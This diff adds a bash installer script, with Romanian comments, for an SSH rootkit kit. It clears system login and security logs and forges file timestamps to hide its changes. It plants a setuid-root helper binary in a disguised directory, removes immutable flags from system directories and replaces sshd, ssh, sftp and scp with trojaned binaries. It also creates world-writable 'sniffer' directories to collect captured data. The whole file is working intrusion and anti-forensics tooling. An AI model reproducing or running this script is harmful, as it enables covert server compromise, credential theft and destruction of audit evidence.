@@ -1,0 +1,178 @@
+#!/bin/bash
+
+# echo -e "\033[0;31m [-] \033[0m\033[0m" # red
+# echo -e "\033[0;32m [+] \033[0m\033[0m" # green
+# echo -e "\033[0;36m xxx \033[0m\033[0m" #cyan
+
+if [ $# != 2 ]; then good=0 ; fi
+
+if [ "$1" == "test" ] ; then
+	test=1
+elif [ "$1" == "install" ] ; then
+	install=1
+else
+	good=0
+fi
+
+if [ "$good" = "0" ] ; then
+	echo
+        echo -e "\033[0;31m $0 [test | install] [rk kit] \033[0m\033[0m" # red
+        echo -e "\033[0;36m example: $0 test 2centos6-32bits \033[0m\033[0m" #cyan
+	echo
+	exit
+fi
+
+if [ ! -s "$2" ] ; then 
+	echo
+	echo -e "\033[0;31m $2 is not a valid rk kit \033[0m\033[0m" # red
+	echo
+	exit
+fi
+
+
+
+### verificam daca e instalat ce folosim
+DEP=(
+'/usr/bin/curl'
+'/bin/sed'
+'/usr/bin/gcc'
+)
+for t in "${DEP[@]}" ; do
+        if [ -f $t ] ; then
+                echo -ne "\033[0;32m [+] \033[0m\033[0m" # green
+                echo "$t - found"
+        else
+                echo -ne "\033[0;31m [-] \033[0m\033[0m" # red
+                echo "$t - MISSING OR EMPTY"
+                good=0
+        fi
+done
+if [ "$good" = "0" ] ; then echo "Some files are missing or empty. Existing." ; echo ; exit ; fi
+
+
+
+
+
+######## golim logurile de pe server - pe viitor tb gasita alta varianta
+> /var/log/messages
+> /var/log/secure
+> /var/log/lastlog
+> /var/log/wtmp
+# EOF golim logurile de pe server - pe viitor tb gasita alta varianta
+
+
+######## facem directorul si fiserul de unde luam timestamp si facem functia
+mkdir /usr/lib/libu.a/ 2>/dev/null
+echo "timestamp" > /usr/lib/libu.a/TS04840203583
+touch -r /usr/sbin/sshd /usr/lib/libu.a
+touch -r /usr/sbin/sshd /usr/lib/libu.a/TS04840203583
+luam_timestamp() {
+		touch -r /usr/lib/libu.a/TS04840203583 $1
+		}
+####### EOF facem directorul si fiserul de unde luam timestamp si facem functia
+
+
+########################################## test part
+if [ "$test" = "1" ] ; then
+	# echo "doing test"
+	if [ -s "$2/run-libcheck" ] ; then
+		cd $2
+		./run-libcheck
+		cd ..
+	fi
+	echo
+	echo -e "\033[0;36m [x] setting up permissions \033[0m\033[0m" #cyan
+	echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "permision 400 for /etc/ssh/ssh_host*" ;  chmod 400 /etc/ssh/ssh_host*
+	echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "creating: /var/empty" ;  mkdir /var/empty 1>/dev/null 2>/dev/null
+	
+	echo
+        echo -e "\033[0;36m [x] moving sshd config files \033[0m\033[0m" #cyan
+                echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo /etc/ssh/sshd_config
+                        cp -f sshd_config /etc/ssh
+			luam_timestamp /etc/ssh/sshd_config
+                echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo /etc/ssh/ssh_config
+                        cp -f ssh_config /etc/ssh
+			luam_timestamp /etc/ssh/ssh_config
+
+	echo
+	echo -e "\033[0;36m [x] test ended. Now test the sshd :) \033[0m\033[0m" #cyan
+	cd $2
+	rm -rf test-sshd ; cp sshd-eu test-sshd
+	cd ..
+	maindir=`pwd` ; workdir="$maindir/$2"
+	echo " $workdir/test-sshd -p 65535"
+	echo " telnet 127.0.0.1 65535 / ssh root@127.0.0.1 -p 65535"
+	echo " killall -9 test-sshd"
+	
+	echo
+	echo -e "\033[0;36m [x] Daca totul e bine, ruleaza ./run install $2 \033[0m\033[0m" #cyan
+	echo
+exit
+fi
+# EOF test part
+
+
+
+
+
+########################################## install part
+if [ "$install" = "1" ] ; then
+	echo
+        echo -e "\033[0;36m [x] creating sniffer files and main dir \033[0m\033[0m" #cyan
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "Creating: /etc/pps"
+			mkdir /etc/pps ; chmod 777 /etc/pps/
+			luam_timestamp /etc/pps
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "Creating: /etc/X11/.pr"
+			mkdir /etc/X11 ; chmod 777 /etc/X11/ ; > /etc/X11/.pr
+			luam_timestamp /etc/X11/.pr
+	
+	echo
+	echo -e "\033[0;36m [x] creating goprem dir & file (suid) \033[0m\033[0m" #cyan
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "creating: /usr/include/arpa"
+			mkdir /usr/include 1>/dev/null 2>/dev/null
+			mkdir /usr/include/arpa 1>/dev/null 2>/dev/null
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "gcc goprem.c & moving"
+			gcc goprem.c -o goprem 2>/dev/null
+			mv goprem /usr/include/arpa/
+                        chown root:root /usr/include/arpa/goprem
+                        chmod +s /usr/include/arpa/goprem
+			luam_timestamp /usr/include/arpa/goprem
+
+	echo
+	echo -e "\033[0;36m [x] getting permisions in \033[0m\033[0m" #cyan
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "/usr/sbin"
+			chattr -R -aui /usr/sbin/ 1>/dev/null 2>/dev/null
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "/usr/bin" 
+			chattr -R -aui /usr/bin/ 1>/dev/null 2>/dev/null
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "/bin"
+			chattr -R -aui /bin/ 1>/dev/null 2>/dev/null
+
+	echo
+	echo -e "\033[0;36m [x] replacing system files \033[0m\033[0m" #cyan
+		maindir=`pwd` ; workdir="$maindir/$2"
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "saving server's sshd in /etc/pps/old-srvf/"
+			mkdir /etc/pps/old-srvf ; cp /usr/sbin/sshd /etc/pps/old-srvf/old55hd
+			luam_timestamp /etc/pps/old-srvf
+			luam_timestamp /etc/pps/old-srvf/old55hd
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "/usr/sbin/sshd"
+			cp -f $workdir/sshd-eu /usr/sbin/sshd
+			luam_timestamp /usr/sbin/sshd
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "/usr/bin/ssh"
+			cp -f $workdir/ssh /usr/bin/ssh
+			luam_timestamp /usr/bin/ssh
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "/usr/bin/sftp"
+			cp -f $workdir/sftp /usr/bin/sftp
+			luam_timestamp /usr/bin/sftp
+		echo -ne "\033[0;32m [+] \033[0m\033[0m" ; echo "/usr/bin/scp"
+			cp -f $workdir/scp /usr/bin/scp
+			luam_timestamp /usr/bin/scp
+
+	echo
+	echo -e "\033[0;36m [x] moving to the last step (sshd restart file) \033[0m\033[0m" #cyan
+	echo " mv s_res /tmp/.bla ; cd /tmp/.bla ; rm -rf rkkit*"
+	echo " nohup ./s_res 1>/dev/null 2>/dev/null "
+	echo " tar zxf side_files.tgz -C /etc/pps ; cd /etc/pps/side_files ; rm -rf /tmp/.bla"
+	echo
+exit
+fi
+# EOF install part
